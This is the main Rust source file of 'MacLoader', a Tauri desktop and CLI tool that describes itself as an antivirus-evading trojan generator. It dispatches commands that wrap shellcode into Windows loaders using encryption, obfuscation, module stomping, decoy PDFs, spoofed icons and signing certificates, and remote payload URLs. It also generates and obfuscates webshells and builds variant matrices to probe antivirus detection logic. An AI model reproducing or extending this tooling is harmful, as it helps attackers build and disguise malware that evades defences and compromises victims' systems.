// MacLoader -- macOS 免杀马生成器 (Tauri 2 + Rust)
//
// 本文件只做三件事：
//   1. 补 PATH（GUI 从 Finder 启动时 PATH 极其贫瘠）
//   2. 无界面 CLI 模式
//   3. 注册 Tauri 命令
//
// 真正的构建逻辑都在 `builder/` 下按职责拆好了，改功能请去对应子模块。

#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod builder;

use std::fs;
use std::io::{BufRead, BufReader};
use std::path::Path;
use std::process::{Command, Stdio};
use std::sync::mpsc::channel;

use builder::inspect::InspectReport;
use builder::profile::Profile;
use builder::variants::VariantRow;
use builder::webshell::{WsOpts, WsResult};
use builder::wrap::{WrapOpts, WrapResult};
use builder::{
    validate, EnvInfo, FileItem, GenOpts, GenResult, APP_VERSION, ENC_VALUES, HARDEN_VALUES,
    LOAD_VALUES, MODE_VALUES, PROT_VALUES, TIME_VALUES,
};
use serde::Serialize;
use tauri::Emitter;
use tauri_plugin_dialog::DialogExt;

/* ============================ Tauri 命令 ============================ */

#[tauri::command]
fn app_version() -> String {
    APP_VERSION.to_string()
}

#[tauri::command]
fn check_env() -> EnvInfo {
    EnvInfo {
        x64: builder::tools::or_not_found(builder::tools::compiler("x64")),
        x86: builder::tools::or_not_found(builder::tools::compiler("x86")),
        windres: builder::tools::or_not_found(builder::tools::windres("x64")),
        openssl: builder::tools::or_not_found(builder::tools::openssl()),
        // 用 find（会查 /opt/homebrew/bin 等目录）而不是 which：
        // GUI app 从 Finder 启动时 PATH 很贫瘠，which 会误报「未找到」
        osslsigncode: builder::tools::or_not_found(builder::tools::osslsigncode()),
        brew: builder::tools::or_not_found(builder::tools::brew()),
    }
}

#[tauri::command]
async fn generate(opts: GenOpts) -> Result<GenResult, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let r = builder::generate::generate(&opts);
        // 成功就记住这次配置，下次启动自动恢复
        if r.ok {
            let _ = builder::profile::save_last(&opts);
        }
        r
    })
    .await
    .map_err(|e| format!("生成任务执行失败: {e}"))
}

#[tauri::command]
async fn inspect_exe(path: String) -> Result<InspectReport, String> {
    tauri::async_runtime::spawn_blocking(move || builder::inspect::inspect(&path))
        .await
        .map_err(|e| format!("自审任务执行失败: {e}"))?
}

/* ---------- 变体矩阵（GUI） ---------- */

#[derive(Clone, Serialize)]
struct MatrixEvt {
    phase: String, // start | row | done
    step: usize,
    total: usize,
    row: Option<VariantRow>,
}

#[tauri::command]
async fn run_matrix(app: tauri::AppHandle, opts: GenOpts) -> Result<Vec<VariantRow>, String> {
    if let Err(e) = validate(&opts) {
        return Err(e);
    }
    if opts.payload.trim().is_empty() {
        return Err("请先选择 payload".into());
    }
    // 每个变体都要跑一次 mingw 编译，十几秒到几分钟不等，必须走后台线程
    tauri::async_runtime::spawn_blocking(move || {
        let rows = builder::variants::run(&opts, |step, total, row| {
            let _ = app.emit(
                "matrix-progress",
                MatrixEvt {
                    phase: "row".into(),
                    step,
                    total,
                    row: Some(row.clone()),
                },
            );
        });
        let _ = app.emit(
            "matrix-progress",
            MatrixEvt {
                phase: "done".into(),
                step: rows.len(),
                total: rows.len(),
                row: None,
            },
        );
        rows
    })
    .await
    .map_err(|e| e.to_string())
}

/* ---------- Webshell ---------- */

#[tauri::command]
async fn ws_generate(opts: WsOpts) -> Result<WsResult, String> {
    tauri::async_runtime::spawn_blocking(move || builder::webshell::generate(&opts))
        .await
        .map_err(|e| format!("Webshell 生成任务执行失败: {e}"))
}

#[tauri::command]
async fn ws_matrix(opts: WsOpts) -> Result<Vec<VariantRow>, String> {
    tauri::async_runtime::spawn_blocking(move || builder::variants::run_ws(&opts))
        .await
        .map_err(|e| format!("Webshell 矩阵任务执行失败: {e}"))
}

/// 混淆一份已有的 webshell 脚本（保功能）
#[tauri::command]
async fn ws_wrap(opts: WrapOpts) -> Result<WrapResult, String> {
    tauri::async_runtime::spawn_blocking(move || builder::wrap::wrap(&opts))
        .await
        .map_err(|e| format!("脚本混淆任务执行失败: {e}"))
}

/* ---------- 配置方案 ---------- */

#[tauri::command]
fn profile_save(name: String, opts: GenOpts) -> Result<String, String> {
    if name.trim().is_empty() {
        return Err("方案名不能为空".into());
    }
    builder::profile::save(&name, &opts)
}

#[tauri::command]
fn profile_list() -> Vec<Profile> {
    builder::profile::list()
}

#[tauri::command]
fn profile_load(name: String) -> Result<GenOpts, String> {
    builder::profile::load(&name)
}

#[tauri::command]
fn profile_delete(name: String) -> Result<(), String> {
    builder::profile::delete(&name)
}

#[tauri::command]
fn last_opts() -> Option<GenOpts> {
    builder::profile::load_last()
}

/// 各下拉框的合法取值，前端不再硬编码，避免两边漂移
#[derive(Serialize)]
struct Enums {
    encoding: Vec<String>,
    mode: Vec<String>,
    protect: Vec<String>,
    time: Vec<String>,
    load: Vec<String>,
    harden: Vec<String>,
}

#[tauri::command]
fn option_values() -> Enums {
    Enums {
        encoding: ENC_VALUES.iter().map(|s| s.to_string()).collect(),
        mode: MODE_VALUES.iter().map(|s| s.to_string()).collect(),
        protect: PROT_VALUES.iter().map(|s| s.to_string()).collect(),
        time: TIME_VALUES.iter().map(|s| s.to_string()).collect(),
        load: LOAD_VALUES.iter().map(|s| s.to_string()).collect(),
        harden: HARDEN_VALUES.iter().map(|s| s.to_string()).collect(),
    }
}

/* ==================== 依赖安装（首次启动引导页用） ==================== */

#[derive(Clone, Serialize)]
pub struct DepInstallEvt {
    pub phase: String, // start | log | pkg_done | done | error
    pub pkg: String,
    pub line: String,
    pub step: usize,
    pub total: usize,
}

fn dep_evt(phase: &str, pkg: &str, line: &str, step: usize, total: usize) -> DepInstallEvt {
    DepInstallEvt {
        phase: phase.into(),
        pkg: pkg.into(),
        line: line.into(),
        step,
        total,
    }
}

/// 包管理器是否已安装（Windows 恒为 false）
#[tauri::command]
fn has_brew() -> bool {
    builder::tools::brew().is_some()
}

/// 平台信息：宿主 OS / 是否支持自动装依赖 / 手工安装指引
#[derive(Clone, serde::Serialize)]
struct HostInfo {
    os: String,
    can_install: bool,
    pkg_manager: String,
    install_hint: String,
}

#[tauri::command]
fn host_info() -> HostInfo {
    HostInfo {
        os: builder::platform::host_os().to_string(),
        can_install: builder::platform::supports_dep_install(),
        pkg_manager: builder::platform::package_manager_name().to_string(),
        install_hint: builder::platform::install_hint(),
    }
}

const ALLOWED_BREW_PACKAGES: &[&str] = &["mingw-w64", "osslsigncode"];

fn validate_brew_packages(pkgs: &[String]) -> Result<(), String> {
    if let Some(pkg) = pkgs
        .iter()
        .find(|pkg| !ALLOWED_BREW_PACKAGES.contains(&pkg.as_str()))
    {
        return Err(format!(
            "不允许通过应用安装依赖包: {pkg} (允许: {})",
            ALLOWED_BREW_PACKAGES.join("|")
        ));
    }
    Ok(())
}

/// 逐个 brew install，把 brew 的实时输出推给前端（事件名 dep-install）。
///
/// 修掉的问题：旧实现在循环里对每个包重新 find_tool(brew)，而且是在
/// `spawn_blocking` 内部逐个 await 之前重复探测 —— 万一 brew 在第一个包
/// 装完后路径变化，后续包会拿到不同结果。现在循环外探测一次。
#[tauri::command]
async fn install_deps(app: tauri::AppHandle, pkgs: Vec<String>) -> Result<(), String> {
    validate_brew_packages(&pkgs)?;
    let total = pkgs.len();
    if total == 0 {
        return Ok(());
    }
    // 走平台层：macOS 拿到 (brew, ["install", pkg])，
    // 其它平台返回 None 并由上面给出的指引文案兜底。
    let (mgr, mgr_args) = builder::platform::install_command().ok_or_else(|| {
        format!(
            "当前平台（{}）不提供自动安装依赖。\n{}",
            builder::platform::host_os(),
            builder::platform::install_hint()
        )
    })?;

    tauri::async_runtime::spawn_blocking(move || -> Result<(), String> {
        for (i, pkg) in pkgs.iter().enumerate() {
            let step = i + 1;
            let _ = app.emit("dep-install", dep_evt("start", pkg, "", step, total));

            let mut child = Command::new(&mgr)
                .args(mgr_args.iter().map(|a| a.as_str()))
                .arg(pkg)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()
                .map_err(|e| format!("无法启动 brew: {e}"))?;

            let out = child.stdout.take();
            let err = child.stderr.take();
            let (tx, rx) = channel::<String>();

            if let Some(o) = out {
                let tx = tx.clone();
                std::thread::spawn(move || {
                    for l in BufReader::new(o).lines().map_while(Result::ok) {
                        let _ = tx.send(l);
                    }
                });
            }
            if let Some(e) = err {
                let tx = tx.clone();
                std::thread::spawn(move || {
                    for l in BufReader::new(e).lines().map_while(Result::ok) {
                        let _ = tx.send(l);
                    }
                });
            }
            drop(tx);

            // 通道关闭即两个读线程结束，此时 brew 已跑完
            for line in rx {
                let _ = app.emit("dep-install", dep_evt("log", pkg, &line, step, total));
            }

            let st = child.wait().map_err(|e| e.to_string())?;
            if !st.success() {
                let _ = app.emit(
                    "dep-install",
                    dep_evt("error", pkg, "安装失败，详见上方输出", step, total),
                );
                return Err(format!("{pkg} 安装失败（退出码 {:?}）", st.code()));
            }
            let _ = app.emit("dep-install", dep_evt("pkg_done", pkg, "", step, total));
        }
        let _ = app.emit("dep-install", dep_evt("done", "", "", total, total));
        Ok(())
    })
    .await
    .map_err(|e| e.to_string())?
}

#[tauri::command]
fn list_icons() -> Vec<String> {
    builder::LIB_ICONS.iter().map(|(n, _)| n.to_string()).collect()
}

#[tauri::command]
async fn pick_file(app: tauri::AppHandle, kind: String) -> Option<String> {
    let dlg = app.dialog().clone();
    let r = if kind == "dir" {
        dlg.file().blocking_pick_folder()
    } else if kind == "icon" {
        dlg.file()
            .add_filter("图标", &["ico", "png", "jpg", "jpeg"])
            .add_filter("所有文件", &["*"])
            .blocking_pick_file()
    } else if kind == "wsfile" {
        dlg.file()
            .add_filter("脚本", &["php", "asp", "aspx", "jsp"])
            .add_filter("所有文件", &["*"])
            .blocking_pick_file()
    } else if kind == "pdf" {
        dlg.file()
            .add_filter("PDF", &["pdf"])
            .add_filter("所有文件", &["*"])
            .blocking_pick_file()
    } else {
        dlg.file()
            .add_filter("payload", &["bin", "raw", "c", "txt"])
            .add_filter("所有文件", &["*"])
            .blocking_pick_file()
    };
    r.and_then(|p| p.into_path().ok())
        .map(|p| p.to_string_lossy().to_string())
}

#[tauri::command]
fn list_dir(dir: String) -> Vec<FileItem> {
    let mut v = Vec::new();
    if let Ok(rd) = fs::read_dir(&dir) {
        for e in rd.flatten() {
            let p = e.path();
            let is_exe = p
                .extension()
                .map(|x| x.eq_ignore_ascii_case("exe"))
                .unwrap_or(false);
            if !is_exe {
                continue;
            }
            let md = e.metadata().ok();
            let size = md.as_ref().map(|m| m.len()).unwrap_or(0);
            let mtime = md
                .as_ref()
                .and_then(|m| m.modified().ok())
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            v.push(FileItem {
                name: p.file_name().unwrap_or_default().to_string_lossy().to_string(),
                path: p.to_string_lossy().to_string(),
                size,
                mtime,
            });
        }
    }
    v.sort_by(|a, b| b.mtime.cmp(&a.mtime));
    v
}

#[tauri::command]
fn reveal(path: String) {
    let target = Path::new(&path);
    let dir = if target.is_dir() {
        target.to_path_buf()
    } else {
        target.parent().map(|p| p.to_path_buf()).unwrap_or_default()
    };
    let _ = Command::new("open").arg(dir).spawn();
}

/* ============================ CLI ============================ */

const KNOWN_FLAGS: &[&str] = &[
    "--payload",
    "--out-dir",
    "--name",
    "--arch",
    "--encoding",
    "--encrypt",
    "--mode",
    "--key",
    "--load",
    "--url",
    "--time",
    "--time-value",
    "--harden",
    "--stomp-dll",
    "--icon",
    "--decoy",
    "--sign",
    "--no-sign",
    "--no-obf",
    "--no-res",
    "--no-errors",
    "--console",
    "--tsa",
    "--cert-subj",
    "--protect",
    "--anti-strict",
    "--matrix",
    "--inspect",
    "--no-junk",
    "--no-split",
    "--ws",
    "--ws-lang",
    "--ws-password",
    "--ws-kind",
    "--ws-hex",
    "--ws-enc",
    "--wrap",
    "--wrap-lang",
    "--wrap-src",
    "--no-wrap-encode",
    "--keep-comments",
    "--help",
    "--version",
];

fn cli_usage() -> String {
    format!(
        "用法:\n\
         macloader --cli --payload <文件> [选项]\n\
         \n\
         PE 构建:\n\
         \x20 --out-dir 目录        输出目录（默认 .）\n\
         \x20 --name 名称           输出文件名（默认 loader.exe）\n\
         \x20 --arch x64|x86        目标架构（默认 {}）\n\
         \x20 --encoding <形态>     {}\n\
         \x20 --mode <方式>         {}\n\
         \x20 --protect <保护>      {}\n\
         \x20 --load <方式>         {}\n\
         \x20 --url <URL>           远程模式载荷地址\n\
         \x20 --time <模式>         {}\n\
         \x20 --time-value <时间>   2024-03-01T10:30\n\
         \x20 --icon lib:notepad|路径\n\
         \x20 --decoy x.pdf        内嵌诱饵 PDF\n\
         \x20 --harden <项>         {}（逗号分隔）\n\
         \x20 --stomp-dll <名>      模块踩踏目标（默认 winhttp.dll）\n\
         \x20 --tsa <URL>           时间戳服务器\n\
         \x20 --cert-subj <主题>    证书主题（默认按图标推导）\n\
         \x20 --key 0x41            指定 XOR 密钥\n\
         \x20 --no-sign / --no-obf / --no-res / --no-errors / --console / --anti-strict\n\
         \x20 --matrix              生成变体对照矩阵\n\
         \x20 --inspect <exe>       静态自审一个已有产物\n\
         \n\
         Webshell:\n\
         \x20 --ws --ws-lang php --ws-password <密码> [--ws-kind exec|cmd|shellcode|eval]\n\
         \x20     [--ws-hex <十六进制>] [--ws-enc xor,b64] --out-dir <目录> --name shell.php\n\
         \n\
         环境变量:\n\
         \x20 MACLOADER_SEED=<n>    固定随机序列，同配置产出逐字节相同\n\
         \x20 MACLOADER_KEEP=1      保留中间源码目录\n",
        builder::d_arch(),
        ENC_VALUES.join("|"),
        MODE_VALUES.join("|"),
        PROT_VALUES.join("|"),
        LOAD_VALUES.join("|"),
        TIME_VALUES.join("|"),
        HARDEN_VALUES.join("|"),
    )
}

fn run_cli(argv: &[String]) -> i32 {
    if argv.iter().any(|a| a == "--version") {
        println!("macloader {APP_VERSION}");
        return 0;
    }
    if argv.iter().any(|a| a == "--help") {
        println!("{}", cli_usage());
        return 0;
    }

    // 未知参数直接报错退出，避免「拼错被静默忽略、按默认值出 exe」
    let unknown: Vec<&str> = argv
        .iter()
        .skip(1)
        .filter(|a| {
            a.starts_with("--") && a.as_str() != "--cli" && !KNOWN_FLAGS.contains(&a.as_str())
        })
        .map(|a| a.as_str())
        .collect();
    if !unknown.is_empty() {
        eprintln!("未知参数: {}", unknown.join(" "));
        eprintln!("{}", cli_usage());
        return 2;
    }
    let get = |k: &str| -> Option<String> {
        argv.iter()
            .position(|a| a == k)
            .and_then(|i| argv.get(i + 1))
            .cloned()
    };

    /* --inspect: 独立分支，不需要 payload */
    if let Some(p) = get("--inspect") {
        return match builder::inspect::inspect(&p) {
            Ok(r) => {
                println!("文件: {}", r.path);
                println!("大小: {} bytes · sha256 = {}", r.size, &r.sha256[..16]);
                println!("架构: {} ({}bit)", r.machine, r.bits);
                println!("时间戳: {}", r.timestamp);
                println!(
                    "签名: {} · 资源: {}",
                    if r.signed { "有" } else { "无" },
                    if r.has_resources { "有" } else { "无" }
                );
                println!("自审得分: {}/100", r.score);
                println!();
                for f in &r.findings {
                    let mark = match f.level.as_str() {
                        "pass" => "[OK]  ",
                        "warn" => "[警告]",
                        _ => "[致命]",
                    };
                    println!("{mark} {:<14} {}", f.title, f.detail);
                    if !f.hint.is_empty() {
                        println!("               ↳ {}", f.hint);
                    }
                }
                0
            }
            Err(e) => {
                eprintln!("自审失败: {e}");
                1
            }
        };
    }

    /* --wrap: 混淆一份已有脚本（保功能） */
    if argv.iter().any(|a| a == "--wrap") {
        let src = get("--wrap-src").unwrap_or_default();
        let enc: Vec<String> = get("--ws-enc")
            .map(|v| {
                v.split(',')
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect()
            })
            .unwrap_or_else(|| vec!["xor".into(), "b64".into()]);
        let opts = WrapOpts {
            lang: get("--wrap-lang").unwrap_or_else(|| "php".into()),
            src_path: src,
            encodes: enc,
            encode_whole: !argv.iter().any(|a| a == "--no-wrap-encode"),
            rename_vars: true,
            junk: !argv.iter().any(|a| a == "--no-junk"),
            split_strings: !argv.iter().any(|a| a == "--no-split"),
            strip_comments: !argv.iter().any(|a| a == "--keep-comments"),
            out_dir: get("--out-dir").unwrap_or_else(|| ".".into()),
            out_name: get("--name").unwrap_or_default(),
        };
        if opts.src_path.trim().is_empty() {
            eprintln!("--wrap 需要 --wrap-src <脚本路径>");
            return 2;
        }
        let r = builder::wrap::wrap(&opts);
        println!("{}", r.log);
        if r.ok {
            println!("\n--- 生成内容 ---\n{}", r.code);
            let (ok, msg) =
                builder::webshell::syntax_check(&opts.lang, std::path::Path::new(&r.output));
            println!("\n[5] 语法自检: {}", if ok { "通过" } else { &msg });
        }
        return if r.ok { 0 } else { 1 };
    }

    /* --ws: Webshell 分支 */
    if argv.iter().any(|a| a == "--ws") {
        let enc: Vec<String> = get("--ws-enc")
            .map(|v| {
                v.split(',')
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect()
            })
            .unwrap_or_else(|| vec!["xor".into(), "b64".into()]);
        let opts = WsOpts {
            lang: get("--ws-lang").unwrap_or_else(|| "php".into()),
            password: get("--ws-password").unwrap_or_else(|| "pass".into()),
            payload_kind: get("--ws-kind").unwrap_or_else(|| "exec".into()),
            raw_hex: get("--ws-hex").unwrap_or_default(),
            encodes: enc,
            rename_vars: true,
            junk: true,
            split_strings: true,
            out_dir: get("--out-dir").unwrap_or_else(|| ".".into()),
            out_name: get("--name").unwrap_or_else(|| "shell.php".into()),
        };
        let r = builder::webshell::generate(&opts);
        println!("{}", r.log);
        if r.ok {
            let (ok, msg) =
                builder::webshell::syntax_check(&opts.lang, std::path::Path::new(&r.output));
            if ok {
                println!("[5] 语法自检通过");
            } else {
                println!("[5] 语法自检未通过:\n{msg}");
            }
            println!("\n--- 生成内容 ---\n{}", r.code);
        }
        return if r.ok { 0 } else { 1 };
    }

    let payload = get("--payload").unwrap_or_default();
    if payload.is_empty() {
        eprintln!("{}", cli_usage());
        return 2;
    }

    let opts = GenOpts {
        payload,
        out_dir: get("--out-dir").unwrap_or_else(|| ".".into()),
        out_name: get("--name").unwrap_or_else(|| "loader.exe".into()),
        arch: get("--arch").unwrap_or_else(builder::d_arch),
        encoding: get("--encoding")
            .or_else(|| get("--encrypt"))
            .unwrap_or_else(builder::d_enc),
        obfuscate: !argv.iter().any(|a| a == "--no-obf"),
        mode: get("--mode").unwrap_or_else(builder::d_mode),
        console: argv.iter().any(|a| a == "--console"),
        xor_key: get("--key").and_then(|v| {
            let v = v.trim().to_lowercase();
            if let Some(h) = v.strip_prefix("0x") {
                u32::from_str_radix(h, 16).ok()
            } else {
                v.parse::<u32>().ok()
            }
        }),
        load_mode: get("--load").unwrap_or_else(builder::d_load),
        remote_url: get("--url").unwrap_or_default(),
        time_mode: get("--time").unwrap_or_else(builder::d_time),
        time_value: get("--time-value").unwrap_or_else(builder::d_timeval),
        harden: get("--harden")
            .map(|v| {
                v.split(',')
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect()
            })
            .unwrap_or_default(),
        stomp_dll: get("--stomp-dll").unwrap_or_default(),
        show_errors: !argv.iter().any(|a| a == "--no-errors"),
        icon: get("--icon").unwrap_or_else(builder::d_icon),
        res_full: !argv.iter().any(|a| a == "--no-res"),
        decoy: get("--decoy").unwrap_or_default(),
        sign: !argv.iter().any(|a| a == "--no-sign"),
        tsa_url: get("--tsa").unwrap_or_else(builder::d_tsa),
        // 未显式指定时，证书主题按图标预设联动（避免与 VERSIONINFO 的
        // CompanyName 矛盾）；显式给了就尊重用户输入。
        cert_subject: get("--cert-subj")
            .unwrap_or_else(|| builder::resource::preset_subject(&get("--icon").unwrap_or_else(builder::d_icon))),
        protect: get("--protect").unwrap_or_else(builder::d_prot),
        anti_strict: argv.iter().any(|a| a == "--anti-strict"),
    };

    if let Err(e) = validate(&opts) {
        eprintln!("{e}");
        return 2;
    }

    // --matrix: 一次生成一整组「每次只差一个变量」的 exe，便于实测后反推引擎判据。
    if argv.iter().any(|a| a == "--matrix") {
        let rows = builder::variants::run(&opts, |step, total, row| {
            let mark = if row.ok { "OK  " } else { "失败" };
            println!(
                "  [{step:>2}/{total}] {mark} {:<14} {} {}",
                row.suffix,
                if row.ok {
                    format!("{} bytes", row.size)
                } else {
                    String::new()
                },
                row.error
            );
        });
        let ok = rows.iter().filter(|r| r.ok).count();
        println!();
        println!("[matrix] 完成: {} 个成功, {} 个失败", ok, rows.len() - ok);
        builder::variants::print_table(&rows);
        return if ok == 0 { 1 } else { 0 };
    }

    let r = builder::generate::generate(&opts);
    println!("{}", r.log);
    if r.ok {
        let _ = builder::profile::save_last(&opts);
    }
    if r.ok {
        0
    } else {
        1
    }
}

/* ============================ main ============================ */

fn main() {
    // 桌面环境启动的 GUI 进程 PATH 可能很贫瘠（macOS 从 Finder 启动不含
    // /opt/homebrew/bin），会导致 brew / osslsigncode 等外部工具
    // 「明明装了却找不到」。这里补齐，之后所有 Command 与 which() 都能命中。
    // Windows 不需要（注册表 PATH 已完整，见 platform::bootstrap_path）。
    let std_path = builder::platform::bootstrap_path();
    if !std_path.is_empty() {
        let cur_path = std::env::var("PATH").unwrap_or_default();
        let sep = builder::platform::path_sep();
        if !cur_path
            .split(sep)
            .any(|d| d == "/opt/homebrew/bin")
        {
            std::env::set_var("PATH", format!("{std_path}{sep}{cur_path}"));
        }
    }

    let argv: Vec<String> = std::env::args().collect();
    if argv
        .iter()
        .any(|a| matches!(a.as_str(), "--cli" | "--help" | "--version"))
    {
        std::process::exit(run_cli(&argv));
    }

    tauri::Builder::default()
        .plugin(tauri_plugin_dialog::init())
        .invoke_handler(tauri::generate_handler![
            app_version,
            check_env,
            has_brew,
            host_info,
            install_deps,
            list_icons,
            pick_file,
            generate,
            inspect_exe,
            run_matrix,
            ws_generate,
            ws_matrix,
            ws_wrap,
            profile_save,
            profile_list,
            profile_load,
            profile_delete,
            last_opts,
            option_values,
            list_dir,
            reveal
        ])
        .run(tauri::generate_context!())
        .expect("MacLoader 启动失败");
}

/* ============================ 集成测试辅助 ============================ */

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn known_flags_cover_all_documented_options() {
        // 防止 cli_usage 写了新的参数却忘了加进 KNOWN_FLAGS，
        // 否则用户按文档敲的参数会被当成未知参数报错。
        for f in [
            "--payload",
            "--out-dir",
            "--name",
            "--arch",
            "--encoding",
            "--mode",
            "--protect",
            "--matrix",
            "--inspect",
            "--ws",
        ] {
            assert!(KNOWN_FLAGS.contains(&f), "{f} 未在 KNOWN_FLAGS 里");
        }
    }

    #[test]
    fn dependency_install_allowlist_rejects_unknown_packages() {
        validate_brew_packages(&["mingw-w64".into(), "osslsigncode".into()])
            .expect("已知依赖应通过");
        assert!(validate_brew_packages(&["curl".into()]).is_err());
    }

    #[test]
    fn cli_rejects_unknown_flag() {
        // run_cli 会 process::exit，所以这里只验证解析逻辑本身
        let argv = vec![
            "--cli".to_string(),
            "--payload".to_string(),
            "x".to_string(),
            "--bogus".to_string(),
        ];
        let unknown: Vec<&str> = argv
            .iter()
            .skip(1)
            .filter(|a| {
                a.starts_with("--") && a.as_str() != "--cli" && !KNOWN_FLAGS.contains(&a.as_str())
            })
            .map(|a| a.as_str())
            .collect();
        assert_eq!(unknown, vec!["--bogus"]);
    }

    #[test]
    fn usage_lists_every_encoding() {
        let u = cli_usage();
        for e in ENC_VALUES {
            assert!(u.contains(e), "用法里缺少 {e}");
        }
    }

    #[test]
    fn option_values_match_constants() {
        let e = option_values();
        assert_eq!(e.encoding.len(), ENC_VALUES.len());
        assert_eq!(e.mode.len(), MODE_VALUES.len());
        assert!(e.encoding.contains(&"chunk".to_string()));
    }

    #[test]
    fn inspect_rejects_missing_file() {
        assert!(builder::inspect::inspect("/no/such/file.exe").is_err());
    }
}
